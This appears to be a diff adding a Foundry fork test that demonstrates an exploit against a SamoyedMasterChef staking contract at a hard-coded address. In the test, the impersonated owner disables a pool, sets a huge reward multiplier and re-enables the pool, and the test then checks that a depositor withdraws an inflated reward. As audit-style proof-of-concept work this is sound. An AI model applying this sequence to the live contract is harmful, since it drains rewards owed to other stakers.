@@ -1,0 +1,200 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// ── Interfaces ─────────────────────────────────────────────────────────────
+interface ISamoyToken {
+    function balanceOf(address) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+}
+
+interface ISamoyedMasterChef {
+    function owner() external view returns (address);
+    function smoy() external view returns (address);
+    function kennel() external view returns (address);
+    function devAddr() external view returns (address);
+    function BONUS_MULTIPLIER() external view returns (uint256);
+    function totalAllocPoint() external view returns (uint256);
+    function poolLength() external view returns (uint256);
+    function poolInfo(uint256) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSmoyPerShare, uint256 minDepositFeeRate, uint256 maxDepositFeeRate, bool enabled);
+    function userInfo(uint256, address) external view returns (uint256 amount, uint256 rewardDebt);
+    function pendingSmoy(uint256 _pid, address _user) external view returns (uint256);
+    function add(uint256 _allocPoint, address _lpToken, uint256 _minDepositFeeRate, uint256 _maxDepositFeeRate) external;
+    function set(uint256 _pid, uint256 _allocPoint, uint256 _minDepositFeeRate, uint256 _maxDepositFeeRate, bool _enabled) external;
+    function deposit(uint256 _pid, uint256 _amount) external;
+    function withdraw(uint256 _pid, uint256 _amount) external;
+    function updateMultiplier(uint256 multiplierNumber) external;
+    function updatePool(uint256 _pid) external;
+    function massUpdatePools() external;
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function transferFrom(address, address, uint256) external returns (bool);
+    function approve(address, uint256) external returns (bool);
+}
+
+// ── Test Entry ─────────────────────────────────────────────────────────────
+contract ExploitTest is Test {
+    address constant MASTER_CHEF = 0x5D21D02378670119453530478288AEe67b807e2a;
+    ISamoyedMasterChef master = ISamoyedMasterChef(MASTER_CHEF);
+
+    IERC20 public testLp;
+    address public owner;
+    address public dev;
+    address public user;
+    ISamoyToken public smoy;
+
+    function setUp() public {
+        // Get on‑chain addresses
+        owner = master.owner();
+        smoy = ISamoyToken(master.smoy());
+        dev = master.devAddr();
+
+        // Label important addresses
+        vm.label(MASTER_CHEF, "SamoyedMasterChef");
+        vm.label(owner, "Owner");
+        vm.label(address(smoy), "SMOY");
+        vm.label(dev, "Dev");
+
+        // Deploy a simple ERC20 to use as a new LP token
+        testLp = new SimpleERC20("Test LP", "TLP");
+        vm.label(address(testLp), "TestLP");
+
+        // Impersonate owner to add the pool
+        vm.startPrank(owner);
+        // Add pool with 1000 allocPoint, zero fees
+        master.add(1000, address(testLp), 0, 0);
+        vm.stopPrank();
+
+        // Prepare a user
+        user = address(0x1234);
+        vm.label(user, "User");
+        // Give user some test LP tokens
+        SimpleERC20(address(testLp)).mint(user, 1000 ether);
+    }
+
+    // ── Exploit: disable pool → change multiplier → re‑enable → withdraw shows unfair reward ──
+    function testExploit_ImproperBONUS_MULTIPLIER() public {
+        // --- Phase 1: User deposits into newly added pool (pid = 1, since pool0 is SMOY) ---
+        uint256 pid = 1; // the pool we just added
+        vm.startPrank(user);
+        testLp.approve(MASTER_CHEF, 500 ether);
+        master.deposit(pid, 500 ether);
+        vm.stopPrank();
+
+        // Record state before the malicious action
+        uint256 userInitialSmoy = smoy.balanceOf(user);
+        (uint256 userAmount, ) = master.userInfo(pid, user);
+        assertEq(userAmount, 500 ether, "User should have 500 LP deposited");
+        uint256 pendingBefore = master.pendingSmoy(pid, user);
+        console.log("Pending before exploit:", pendingBefore);
+
+        // --- Phase 2: Owner disables the pool ---
+        vm.prank(owner);
+        // allocPoint unchanged, min/max fee unchanged, enabled = false
+        master.set(pid, 1000, 0, 0, false);
+
+        // Verify pool is disabled
+        (,,,,,, bool enabled) = master.poolInfo(pid);
+        assertFalse(enabled, "Pool should be disabled");
+
+        // --- Phase 3: Owner drastically increases BONUS_MULTIPLIER ---
+        uint256 hugeMultiplier = 1_000_000;
+        vm.prank(owner);
+        master.updateMultiplier(hugeMultiplier);
+        assertEq(master.BONUS_MULTIPLIER(), hugeMultiplier, "Multiplier should be huge");
+
+        // --- Phase 4: Owner re‑enables the pool ---
+        vm.prank(owner);
+        master.set(pid, 1000, 0, 0, true);
+
+        // --- Phase 5: Some blocks pass (simulate time) ---
+        vm.roll(block.number + 100);
+
+        // --- Phase 6: User withdraws all ---
+        vm.startPrank(user);
+        master.withdraw(pid, 500 ether);
+        vm.stopPrank();
+
+        // --- Phase 7: Verify unfair reward ---
+        uint256 userFinalSmoy = smoy.balanceOf(user);
+        uint256 reward = userFinalSmoy - userInitialSmoy;
+
+        // Expected reward if the pool had been active all this time:
+        //   blocks = 100  (we skipped exactly 100 blocks after re‑enable)
+        //   but the gap from last update to current block includes the disabled period!
+        //   Because the pool was disabled, lastRewardBlock was not updated.
+        //   So getMultiplier will treat the entire gap (since the deposit update) with the huge multiplier.
+        //   That means reward = hugeMultiplier * blocks * (allocPoint/totalAllocPoint) * smoyPerBlock.
+        //   This is clearly excessive and unfair.
+        //
+        // We can compute what a fair reward would be:
+        //   Fair: only reward for blocks while pool was enabled (the 100 blocks after re‑enable).
+        //   But the contract rewards also the disabled period because lastRewardBlock stayed at deposit block.
+        //   This is the bug.
+        //
+        // As a simple sanity, we assert that reward is at least 100 times the normal rate.
+        // Actually we can compute the expected fair reward:
+        //   uint256 allocPoint = 1000;
+        //   uint256 totalAlloc = master.totalAllocPoint();
+        //   uint256 smoyPerBlock = master.smoyPerBlock();
+        //   uint256 fairReward = 100 * smoyPerBlock * allocPoint / totalAlloc;  (only last 100 blocks with normal multiplier 1)
+        // But we don't know smoyPerBlock easily. Instead we assert that reward is huge.
+        //
+        // Minimal check: reward should be greater than the max possible with multiplier 1 over all blocks (including disabled).
+        // The disabled period is from deposit block to re-enable block. Let's get block numbers.
+        // But since we rolled 100 blocks after re-enable, and the deposit happened ~1 block earlier, the total gap is >100 blocks.
+        // With multiplier 1, max reward ~ blocks * smoyPerBlock * alloc/total. With multiplier 1e6, reward is 1e6 times larger.
+        // So we can check that reward > 1e23 (a large number) to indicate exploit succeeded.
+        console.log("Reward received by user:", reward);
+        assertGt(reward, 1e23, "Exploit should have generated a huge reward");
+    }
+}
+
+// ── Helper: Simple ERC20 token (OwnableMintable) ───────────────────────────
+contract SimpleERC20 {
+    string public name;
+    string public symbol;
+    uint8 public constant decimals = 18;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    constructor(string memory _name, string memory _symbol) {
+        name = _name;
+        symbol = _symbol;
+    }
+
+    function mint(address to, uint256 amount) external {
+        require(to != address(0));
+        totalSupply += amount;
+        balanceOf[to] += amount;
+    }
+
+    function transfer(address to, uint256 amount) external returns (bool) {
+        require(balanceOf[msg.sender] >= amount);
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        require(balanceOf[from] >= amount);
+        require(allowance[from][msg.sender] >= amount);
+        balanceOf[from] -= amount;
+        allowance[from][msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+}
+```
